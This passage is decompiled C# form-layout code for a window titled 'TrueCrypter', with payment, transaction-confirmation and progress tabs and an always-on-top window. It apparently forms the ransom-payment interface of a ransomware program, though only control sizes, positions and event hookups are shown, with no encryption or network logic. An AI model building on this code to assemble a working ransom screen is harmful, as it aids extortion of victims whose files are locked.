		((Control)ImgCurrentPaymentMethod).set_Name("ImgCurrentPaymentMethod");
		((Control)ImgCurrentPaymentMethod).set_Size(new Size(200, 42));
		ImgCurrentPaymentMethod.set_SizeMode((PictureBoxSizeMode)2);
		ImgCurrentPaymentMethod.set_TabIndex(5);
		ImgCurrentPaymentMethod.set_TabStop(false);
		((Control)tabPageConfirmation).get_Controls().Add((Control)(object)prgStatus);
		((Control)tabPageConfirmation).get_Controls().Add((Control)(object)txtStatus);
		((Control)tabPageConfirmation).get_Controls().Add((Control)(object)txtConfirmation);
		tabPageConfirmation.set_ImageIndex(4);
		tabPageConfirmation.set_Location(new Point(4, 23));
		((Control)tabPageConfirmation).set_Name("tabPageConfirmation");
		((Control)tabPageConfirmation).set_Size(new Size(456, 268));
		tabPageConfirmation.set_TabIndex(2);
		((Control)tabPageConfirmation).set_Text("Confirmation");
		tabPageConfirmation.set_UseVisualStyleBackColor(true);
		((Control)prgStatus).set_Location(new Point(8, 78));
		((Control)prgStatus).set_Name("prgStatus");
		((Control)prgStatus).set_Size(new Size(440, 23));
		prgStatus.set_Style((ProgressBarStyle)2);
		((Control)prgStatus).set_TabIndex(15);
		((Control)txtStatus).set_BackColor(SystemColors.Control);
		((Control)txtStatus).set_Font(new Font("Microsoft Sans Serif", 8.25f, (FontStyle)2, (GraphicsUnit)3, (byte)0));
		((Control)txtStatus).set_Location(new Point(8, 107));
		((Control)txtStatus).set_Name("txtStatus");
		((TextBoxBase)txtStatus).set_ReadOnly(true);
		((Control)txtStatus).set_Size(new Size(440, 150));
		((Control)txtStatus).set_TabIndex(14);
		((Control)txtStatus).set_Text("");
		txtStatus.add_LinkClicked(new LinkClickedEventHandler(RichText_LinkClicked));
		((Control)txtConfirmation).set_BackColor(SystemColors.Control);
		((Control)txtConfirmation).set_Location(new Point(8, 8));
		((Control)txtConfirmation).set_Name("txtConfirmation");
		((TextBoxBase)txtConfirmation).set_ReadOnly(true);
		((Control)txtConfirmation).set_Size(new Size(440, 64));
		((Control)txtConfirmation).set_TabIndex(14);
		((Control)txtConfirmation).set_Text("");
		txtConfirmation.add_LinkClicked(new LinkClickedEventHandler(RichText_LinkClicked));
		((ButtonBase)btnNext).set_FlatStyle((FlatStyle)0);
		((ButtonBase)btnNext).set_ImageIndex(3);
		((ButtonBase)btnNext).set_ImageList(MyImages);
		((Control)btnNext).set_Location(new Point(436, 321));
		((Control)btnNext).set_Name("btnNext");
		((Control)btnNext).set_Size(new Size(25, 25));
		((Control)btnNext).set_TabIndex(15);
		((ButtonBase)btnNext).set_UseVisualStyleBackColor(true);
		((Control)btnNext).add_Click((EventHandler)btnNext_Click);
		((ButtonBase)btnBack).set_FlatStyle((FlatStyle)0);
		((ButtonBase)btnBack).set_ImageIndex(2);
		((ButtonBase)btnBack).set_ImageList(MyImages);
		((Control)btnBack).set_Location(new Point(405, 321));
		((Control)btnBack).set_Name("btnBack");
		((Control)btnBack).set_Size(new Size(25, 25));
		((Control)btnBack).set_TabIndex(14);
		((ButtonBase)btnBack).set_UseVisualStyleBackColor(true);
		((Control)btnBack).set_Visible(false);
		((Control)btnBack).add_Click((EventHandler)btnBack_Click);
		TransactionWorker.WorkerSupportsCancellation = true;
		TransactionWorker.DoWork += TransactionWorker_DoWork;
		((ContainerControl)this).set_AutoScaleDimensions(new SizeF(6f, 13f));
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
		((Form)this).set_ClientSize(new Size(464, 349));
		((Control)this).get_Controls().Add((Control)(object)btnNext);
		((Control)this).get_Controls().Add((Control)(object)btnBack);
		((Control)this).get_Controls().Add((Control)(object)tabMain);
		((Control)this).get_Controls().Add((Control)(object)val);
		((Form)this).set_FormBorderStyle((FormBorderStyle)1);
		((Form)this).set_Icon((Icon)componentResourceManager.GetObject("$this.Icon"));
		((Form)this).set_MaximizeBox(false);
		((Control)this).set_Name("frmMain");
		((Form)this).set_StartPosition((FormStartPosition)1);
		((Control)this).set_Text("TrueCrypter");
		((Form)this).set_TopMost(true);
		((Form)this).add_FormClosing(new FormClosingEventHandler(frmMain_FormClosing));
		((Form)this).add_Load((EventHandler)frmMain_Load);
		((Control)val).ResumeLayout(false);
		((Control)val).PerformLayout();
		((Control)tabPageTrueCrypter).ResumeLayout(false);
		((Control)tabMain).ResumeLayout(false);
		((Control)tabPagePayment).ResumeLayout(false);
		((Control)tabPagePayment).PerformLayout();
		((ISupportInitialize)ImgCurrentPaymentMethod).EndInit();
		((Control)tabPageConfirmation).ResumeLayout(false);
		((Control)this).ResumeLayout(false);
	}
}
